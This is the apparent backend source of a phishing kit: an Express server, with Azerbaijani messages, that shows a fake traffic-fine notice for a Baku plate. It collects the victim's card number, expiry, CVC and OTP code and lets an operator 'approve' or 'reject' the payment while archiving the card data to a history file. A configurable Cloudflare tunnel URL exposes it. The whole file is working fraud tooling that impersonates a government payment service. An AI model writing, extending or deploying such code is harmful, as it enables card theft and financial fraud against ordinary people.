const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

function getCurrentDateTime() {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    return `${day}.${month}.${year} / ${hours}:${minutes}`;
}

let fineData = {
    protocolNo: `YHQ-${Math.floor(10000 + Math.random() * 90000)}`,
    plateNo: "99-XX-999",
    article: "Maddə 125.1 - Dayanma və durma qaydalarının pozulması",
    dateTime: getCurrentDateTime(),
    location: "Nizami küçəsi 45, Bakı şəhəri",
    points: 2,
    amount: 80.00,
    discountAmount: 20.00,
    isPaid: false,
    isRejected: false,
    rejectReason: null,
    photoUrl: null,
    cardNo: null,
    cardExp: null,
    cardCvc: null,
    otpCode: null,
    hasNewRequest: false,
    isPendingApproval: false,
    apiUrl: "https://continuously-pics-singing-robinson.trycloudflare.com/api"
};

// Persistent History Archive on Disk
const historyFilePath = path.join(__dirname, 'history.json');
let paidHistory = [];
if (fs.existsSync(historyFilePath)) {
    try {
        paidHistory = JSON.parse(fs.readFileSync(historyFilePath, 'utf8'));
    } catch (e) {
        paidHistory = [];
    }
}

function saveHistory() {
    try {
        fs.writeFileSync(historyFilePath, JSON.stringify(paidHistory, null, 2));
    } catch (e) {
        console.error("History save error:", e);
    }
}

// GET fine details
app.get('/api/fine', (req, res) => {
    res.json(fineData);
});

// GET paid history / archive
app.get('/api/history', (req, res) => {
    res.json(paidHistory);
});

// POST update fine details (Admin)
app.post('/api/fine/update', (req, res) => {
    const { plateNo, location } = req.body;

    if (plateNo) {
        fineData.plateNo = plateNo;
        fineData.protocolNo = `YHQ-${Math.floor(10000 + Math.random() * 90000)}`;
        fineData.dateTime = getCurrentDateTime();
    }

    if (location) {
        fineData.location = location;
    }

    fineData.isPaid = false;
    fineData.isRejected = false;
    fineData.rejectReason = null;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;
    fineData.hasNewRequest = false;
    fineData.isPendingApproval = false;

    res.json({ success: true, message: "Cərimə məlumatları yeniləndi", fine: fineData });
});

// POST update Tunnel API URL (Admin)
app.post('/api/tunnel/update', (req, res) => {
    const { apiUrl } = req.body;
    if (apiUrl) {
        fineData.apiUrl = apiUrl;
        try {
            const configPath = path.join(__dirname, '../config.json');
            fs.writeFileSync(configPath, JSON.stringify({ apiUrl }, null, 2));
        } catch (e) {
            console.log("config.json yazılmadı:", e);
        }
    }
    res.json({ success: true, message: "Tünel linki yeniləndi", apiUrl: fineData.apiUrl });
});

// POST reset / clear payment and requests
app.post('/api/reset', (req, res) => {
    fineData.isPaid = false;
    fineData.isRejected = false;
    fineData.rejectReason = null;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;
    fineData.hasNewRequest = false;
    fineData.isPendingApproval = false;
    paidHistory = [];
    saveHistory();
    res.json({ success: true, message: "Bütün ödənişlər, sorğular və tarixçə təmizləndi", fine: fineData });
});

// POST save card details
app.post('/api/card', (req, res) => {
    const { cardNo, cardExp, cardCvc } = req.body;
    if (cardNo) fineData.cardNo = cardNo;
    if (cardExp) fineData.cardExp = cardExp;
    if (cardCvc) fineData.cardCvc = cardCvc;
    fineData.hasNewRequest = true;
    fineData.isPendingApproval = false;
    fineData.isRejected = false;
    fineData.rejectReason = null;
    res.json({ success: true, message: "Kart məlumatları qəbul edildi" });
});

// POST save OTP code
app.post('/api/otp', (req, res) => {
    const { otpCode } = req.body;
    if (otpCode) fineData.otpCode = otpCode;
    fineData.isPendingApproval = true;
    res.json({ success: true, message: "OTP kodu qəbul edildi, təsdiq gözlənilir" });
});

// POST Admin approve payment
app.post('/api/admin/approve', (req, res) => {
    const historyItem = {
        protocolNo: fineData.protocolNo,
        plateNo: fineData.plateNo,
        location: fineData.location,
        amount: fineData.discountAmount,
        cardNo: fineData.cardNo,
        cardExp: fineData.cardExp,
        cardCvc: fineData.cardCvc,
        approvedAt: getCurrentDateTime()
    };
    paidHistory.unshift(historyItem);
    saveHistory();

    fineData.isPaid = true;
    fineData.isRejected = false;
    fineData.isPendingApproval = false;
    fineData.hasNewRequest = false;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;

    res.json({ success: true, message: "Ödəniş admin tərəfindən təsdiqləndi", fine: fineData });
});

// POST Admin reject payment
app.post('/api/admin/reject', (req, res) => {
    const { reason } = req.body;
    fineData.isPaid = false;
    fineData.isRejected = true;
    fineData.rejectReason = reason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
    fineData.isPendingApproval = false;
    fineData.hasNewRequest = false;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;

    res.json({ success: true, message: "Ödəniş rədd edildi", fine: fineData });
});

// POST clear reject status on retry
app.post('/api/clear-reject', (req, res) => {
    fineData.isRejected = false;
    fineData.rejectReason = null;
    fineData.isPendingApproval = false;
    res.json({ success: true });
});

// Clear new request notification flag
app.post('/api/clear-request', (req, res) => {
    fineData.hasNewRequest = false;
    res.json({ success: true });
});

// POST upload violation photo
app.post('/api/upload', upload.single('photo'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, message: "Şəkil yüklənmədi" });
    }
    const protocol = req.protocol;
    const host = req.get('host');
    const photoUrl = `${protocol}://${host}/uploads/${req.file.filename}`;
    fineData.photoUrl = photoUrl;
    res.json({ success: true, message: "Şəkil uğurla yükləndi", photoUrl });
});

// POST process payment
app.post('/api/pay', (req, res) => {
    fineData.isPendingApproval = true;
    res.json({
        success: true,
        message: `Ödəniş sorğusu göndərildi, təsdiq gözlənilir`,
        fine: fineData
    });
});

app.listen(PORT, () => {
    console.log(`Cerime backend server is running on http://localhost:${PORT}`);
});
